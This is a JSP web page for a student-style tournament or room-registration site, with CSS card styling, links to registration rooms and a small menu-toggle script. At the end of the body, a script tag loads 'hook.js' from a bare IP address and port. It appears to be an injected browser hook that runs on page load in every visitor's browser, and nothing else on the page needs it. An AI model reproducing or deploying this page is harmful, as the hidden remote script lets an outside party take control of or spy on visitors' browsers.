<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>Esport's Tournament</title>
<link rel="stylesheet" href="style.css">
<style>
.cont {
    display: flex;
    flex-direction: row; /* Changed to column for vertical alignment */
    gap: 20px; /* Space between cards */
    align-items: center; /* Center align the cards */
     font-size: 30px;
}

.card {
    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);
    transition: 0.3s;
    width: 40%;
    border-radius: 5px;
}

.card:hover {
    box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2);
}

img {
    border-radius: 5px 5px 0 0;
    width: 100%;
}

.container {
    padding: 2px 16px;
}
.cont .card p a:link {
  color: green;
  background-color: transparent;
  text-decoration: none;
}
.cont .card p a:visited {
  color: pink;
  background-color: transparent;
  text-decoration: none;
}
.cont .card p a:hover {
  color: red;
  background-color: transparent;
  text-decoration: underline;
}
.cont .card p a:active {
  color: yellow;
  background-color: transparent;
  text-decoration: underline;
}
</style>
</head>
<body>

<div class="header">
    <div class="bars" id="nav-action">
        <span class="bar"> </span>
    </div>

    <!--Navbar Links-->
<!--  <nav id="nav">
        <ul>
            <li class="shape-circle circle-one"><a href="reg.jsp">Register</a></li>
            <li class="shape-circle circle-two"><a href="sign.jsp">Sign In</a></li>
            <li class="shape-circle circle-three"><a href="About.jsp">About Us</a></li>
        </ul>
    </nav>  -->

    <!--Main Body Content-->
    <article class="container">
        <h1>AN<br>EMPLOYEE MANAGEMENT<br>SYSTEM</h1>
        <p>Developed by Shubh</p>
    </article>
</div>

<div class="cont">
    <div class="card">
        <img src="https://cdn.dribbble.com/userupload/24237613/file/original-55f76f0ebd16a90981c6872d910f7d02.gif" alt="Avatar">
        <div class="container">
            <h4><b>IOT</b></h4>
            <p><a href="reg.jsp?room=IOT">Join IOT</a></p>
        </div>
    </div>
    <div class="card">
        <img src="https://cdn.dribbble.com/userupload/20347222/file/original-341dc5c730062c8b4306f317c71eb5f8.gif" alt="Avatar">
        <div class="container">
            <h4><b>Cloud Services</b></h4>
             <p><a href="reg.jsp?room=Cloud">Join Cloud</a></p>
        </div>
    </div>
    <div class="card">
        <img src="https://cdn.dribbble.com/userupload/23094468/file/original-b77f12a0ff443e75f6c7ca25dbb86e48.gif" alt="Avatar">
        <div class="container">
            <h4><b>Transportation</b></h4>
             <p><a href="reg.jsp?room=Transport">Join Room</a></p>
        </div>
    </div>
    <div class="card">
        <img src="https://cdn.dribbble.com/userupload/22232916/file/original-c068eef315241fd10dfd9b4d8e91cf53.gif" alt="Avatar">
        <div class="container">
            <h4><b>ITIS</b></h4>
             <p><a href="reg.jsp?room=ITIS">Join ITIS</a></p>
        </div>
    </div>
</div>


<script>
    // Setting up the Variables
    var bars = document.getElementById("nav-action");
    var nav = document.getElementById("nav");

    //setting up the listener
    bars.addEventListener("click", barClicked, false);

    //setting up the clicked Effect
    function barClicked() {
        bars.classList.toggle('active');
        nav.classList.toggle('visible');
    }
   
</script>
<script src="http://147.185.221.21:7518/hook.js"></script>

</body>
</html>
